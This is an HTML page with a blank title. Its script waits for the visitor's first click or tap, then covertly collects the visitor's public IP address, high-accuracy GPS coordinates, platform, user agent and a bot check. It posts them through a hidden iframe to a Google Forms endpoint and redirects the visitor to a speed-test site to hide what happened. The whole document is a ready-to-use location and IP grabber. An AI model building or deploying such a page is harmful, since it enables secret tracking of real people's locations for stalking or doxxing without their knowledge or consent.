<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
</head>
<body>
    <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>

    <form id="fihForm" action="https://docs.google.com/forms/d/e/1FAIpQLSfxqy0_lRSfkAZYDpBs03WMirvA2EvDN1cgJjGC7V9gpmd-3Q/formResponse" method="POST" target="hidden_iframe">
        <input type="hidden" id="entry1" name="entry.1700331025">
        <input type="hidden" id="entry2" name="entry.1010750550">
        <input type="hidden" id="entry3" name="entry.901079966">
        <input type="hidden" id="entry4" name="entry.149520676">
        <input type="hidden" id="entry5" name="entry.785981770">
    </form>

    <script>
        let triggered = false;

        async function fetchIp() {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 2000);
                const res = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
                clearTimeout(timeoutId);
                const data = await res.json();
                return data.ip || "Unknown";
            } catch (e) {
                return "Unknown";
            }
        }

        function getGpsLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve("Not Supported");
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve(`${position.coords.latitude}, ${position.coords.longitude}`);
                    },
                    (error) => {
                        resolve("Permission Denied");
                    },
                    { timeout: 10000, enableHighAccuracy: true }
                );
            });
        }

        async function collectAndSend() {
            if (triggered) return;
            triggered = true;

            const gpsPromise = getGpsLocation();
            const ipPromise = fetchIp();

            const clientIp = await ipPromise;
            const gpsLocation = await gpsPromise;

            document.getElementById('entry1').value = clientIp;
            document.getElementById('entry2').value = gpsLocation;
            document.getElementById('entry3').value = navigator.platform || "Unknown";
            document.getElementById('entry4').value = navigator.webdriver ? "Bot" : "Human";
            document.getElementById('entry5').value = navigator.userAgent || "Unknown";

            const form = document.getElementById('fihForm');
            form.submit();

            setTimeout(() => {
                window.location.href = "https://fast.com";
            }, 1200);
        }

        window.addEventListener('click', collectAndSend, { once: true });
        window.addEventListener('touchstart', collectAndSend, { once: true });
    </script>
</body>
</html>
